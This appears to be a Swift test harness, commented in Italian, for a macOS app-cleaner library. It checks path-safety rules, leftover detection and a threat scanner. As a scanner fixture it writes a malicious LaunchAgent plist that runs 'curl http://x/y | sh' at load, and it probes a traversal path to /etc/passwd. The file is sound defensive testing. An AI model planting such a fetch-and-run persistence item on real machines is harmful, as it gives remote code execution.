import Foundation
import DestroyerCore

// Mini-harness runnabile sotto Command Line Tools (dove XCTest/Testing non girano).
// Rispecchia la suite swift-testing in Tests/. Esce con codice != 0 se qualcosa fallisce.

var failures = 0
func check(_ condition: Bool, _ label: String) {
    if condition {
        print("  ✓ \(label)")
    } else {
        print("  ✗ FALLITO: \(label)")
        failures += 1
    }
}
func section(_ name: String) { print("\n▶ \(name)") }

// MARK: - SafePaths
section("SafePaths — guardia di sicurezza")
let sp = SafePaths(home: URL(fileURLWithPath: "/Users/tester", isDirectory: true))
func u(_ p: String) -> URL { URL(fileURLWithPath: p) }

check(sp.isRemovable(u("/Users/tester/Library/Caches/com.acme.App")), "consente Caches utente")
check(sp.isRemovable(u("/Users/tester/Library/Preferences/com.acme.App.plist")), "consente plist preferenze")
check(sp.isRemovable(u("/Applications/Acme.app")), "consente bundle in /Applications")
check(sp.isRemovable(u("/Library/LaunchAgents/com.acme.helper.plist")), "consente LaunchAgent di sistema")
check(!sp.isRemovable(u("/System/Library/CoreServices/Finder.app")), "rifiuta /System")
check(!sp.isRemovable(u("/usr/bin/swift")), "rifiuta /usr/bin")
check(!sp.isRemovable(u("/Library/Apple/System/x")), "rifiuta /Library/Apple")
check(!sp.isRemovable(u("/Applications/Utilities/Terminal.app")), "rifiuta /Applications/Utilities")
check(!sp.isRemovable(u("/Users/tester/Library/Caches")), "rifiuta la root Caches stessa")
check(!sp.isRemovable(u("/Users/tester/Library")), "rifiuta la root Library stessa")
check(!sp.isRemovable(u("/Applications")), "rifiuta /Applications stessa")
check(!sp.isRemovable(u("/")), "rifiuta la radice del filesystem")
check(!sp.isRemovable(u("/Users/tester/Library/Caches/../../../etc/passwd")), "rifiuta traversal fuori allowlist")
check(!sp.isRemovable(u("/Users/tester/Library/Caches-evil/x")), "rifiuta prefisso ingannevole Caches-evil")
check(!sp.isRemovable(u("/Users/altro/Library/Caches/com.acme.App")), "rifiuta home di un altro utente")
check(!sp.isRemovable(u("/usr/local/bin/brew")), "/usr/local non è comunque in allowlist")
// Nuove posizioni di sistema legittime (rimovibili con autorizzazione admin)
check(sp.isRemovable(u("/Library/LaunchDaemons/com.acme.helper.plist")), "consente LaunchDaemons di sistema")
check(sp.isRemovable(u("/Library/PrivilegedHelperTools/com.acme.helper")), "consente PrivilegedHelperTools")
check(sp.isRemovable(u("/Library/Application Support/Acme/data")), "consente /Library/Application Support")
check(!sp.isRemovable(u("/Library/LaunchDaemons")), "rifiuta la root LaunchDaemons stessa")
check(!sp.isRemovable(u("/System/Library/LaunchDaemons/com.apple.x.plist")), "rifiuta LaunchDaemons di /System")

// MARK: - LeftoverFinder (fixture temporanea)
section("LeftoverFinder — fixture temporanea")
let fm = FileManager.default
let fakeHome = fm.temporaryDirectory.appendingPathComponent("destroyer-verify-\(UUID().uuidString)", isDirectory: true)
defer { try? fm.removeItem(at: fakeHome) }

func mkdir(_ url: URL) { try? fm.createDirectory(at: url, withIntermediateDirectories: true) }
func writeFile(_ url: URL, _ text: String = "x") {
    mkdir(url.deletingLastPathComponent())
    try? text.data(using: .utf8)!.write(to: url)
}

let lib = fakeHome.appendingPathComponent("Library", isDirectory: true)
// Residui che DEVONO essere trovati (bundle id com.acme.superapp / nome "SuperApp")
writeFile(lib.appendingPathComponent("Caches/com.acme.superapp/data.bin"))
writeFile(lib.appendingPathComponent("Preferences/com.acme.superapp.plist"))
writeFile(lib.appendingPathComponent("Application Support/SuperApp/state.json"))
writeFile(lib.appendingPathComponent("Logs/com.acme.superapp.log"))
// Rumore che NON deve essere trovato
writeFile(lib.appendingPathComponent("Caches/com.other.tool/noise.bin"))
writeFile(lib.appendingPathComponent("Preferences/com.other.tool.plist"))

let app = InstalledApp(
    bundleURL: URL(fileURLWithPath: "/Applications/SuperApp.app"),
    name: "SuperApp",
    bundleIdentifier: "com.acme.superapp"
)
let finder = LeftoverFinder(home: fakeHome)
let leftovers = finder.findLeftovers(for: app)
let foundPaths = Set(leftovers.map { $0.url.lastPathComponent })

check(leftovers.contains { $0.url.path.contains("Caches/com.acme.superapp") }, "trova la cache per bundle id")
check(foundPaths.contains("com.acme.superapp.plist"), "trova il plist preferenze")
check(leftovers.contains { $0.category == .appSupport }, "trova Application Support per nome")
check(foundPaths.contains("com.acme.superapp.log"), "trova il log per bundle id")
check(!leftovers.contains { $0.url.path.contains("com.other.tool") }, "NON tocca residui di altre app")
// I match per bundle id sono selezionati; quelli per solo-nome no.
if let support = leftovers.first(where: { $0.category == .appSupport }) {
    check(!support.isSelected, "match per solo-nome parte deselezionato (prudenza)")
}
if let cache = leftovers.first(where: { $0.category == .caches }) {
    check(cache.isSelected, "match per bundle id parte selezionato")
}

// MARK: - TrashService (guardia)
section("TrashService — guardia di sicurezza")
let ts = TrashService(safePaths: sp)
do {
    _ = try ts.trash(u("/System/Library/CoreServices/Finder.app"))
    check(false, "trash su /System deve lanciare")
} catch TrashService.TrashError.blockedBySafety {
    check(true, "trash su /System bloccato dalla guardia")
} catch {
    check(false, "errore inatteso: \(error)")
}

// MARK: - SystemStatus (read-only)
section("SystemStatus — lettura stato sistema")
let snap = SystemStatus().snapshot()
check(snap.diskTotalBytes > 0, "spazio disco totale > 0")
check(snap.diskAvailableBytes >= 0 && snap.diskAvailableBytes <= snap.diskTotalBytes, "disco disponibile in [0, totale]")
check(snap.diskUsedFraction >= 0 && snap.diskUsedFraction <= 1, "frazione disco usata in [0,1]")
check(snap.ramTotalBytes > 0, "RAM totale > 0")
check(snap.ramUsedFraction >= 0 && snap.ramUsedFraction <= 1, "frazione RAM usata in [0,1]")
check(snap.trashBytes >= 0, "dimensione Cestino >= 0")
print("  · disco: \(ByteSize.string(snap.diskUsedBytes)) / \(ByteSize.string(snap.diskTotalBytes)) usati")
print("  · RAM:   \(ByteSize.string(snap.ramUsedBytes)) / \(ByteSize.string(snap.ramTotalBytes)) usati")
print("  · Cestino: \(ByteSize.string(snap.trashBytes))")

// MARK: - ThreatScanner (protezione)
section("ThreatScanner — persistenza sospetta")
let tHome = fm.temporaryDirectory.appendingPathComponent("destroyer-threat-\(UUID().uuidString)", isDirectory: true)
defer { try? fm.removeItem(at: tHome) }
let la = tHome.appendingPathComponent("Library/LaunchAgents", isDirectory: true)
mkdir(la)
// Launch item malevolo: eseguibile in /tmp + comando curl|sh negli argomenti.
let evilPlist: [String: Any] = [
    "Label": "com.evil.persist",
    "ProgramArguments": ["/bin/sh", "-c", "curl http://x/y | sh"],
    "RunAtLoad": true
]
let evilURL = la.appendingPathComponent("com.evil.persist.plist")
try? (evilPlist as NSDictionary).write(to: evilURL)
// Launch item benigno: programma di sistema firmato.
let goodPlist: [String: Any] = ["Label": "com.good.tool", "Program": "/bin/ls"]
let goodURL = la.appendingPathComponent("com.good.tool.plist")
try? (goodPlist as NSDictionary).write(to: goodURL)

let threats = ThreatScanner(home: tHome).scan()
check(threats.contains { $0.itemURL.lastPathComponent == "com.evil.persist.plist" }, "segnala il launch item malevolo")
if let evil = threats.first(where: { $0.itemURL.lastPathComponent == "com.evil.persist.plist" }) {
    check(evil.severity == .high, "gravità alta per curl|sh in /tmp")
}
check(!threats.contains { $0.itemURL.lastPathComponent == "com.good.tool.plist" }, "NON segnala /bin/ls firmato")

// MARK: - Esito
print("\n" + String(repeating: "─", count: 40))
if failures == 0 {
    print("TUTTI I CONTROLLI SUPERATI ✓")
    exit(0)
} else {
    print("\(failures) CONTROLLO/I FALLITO/I ✗")
    exit(1)
}
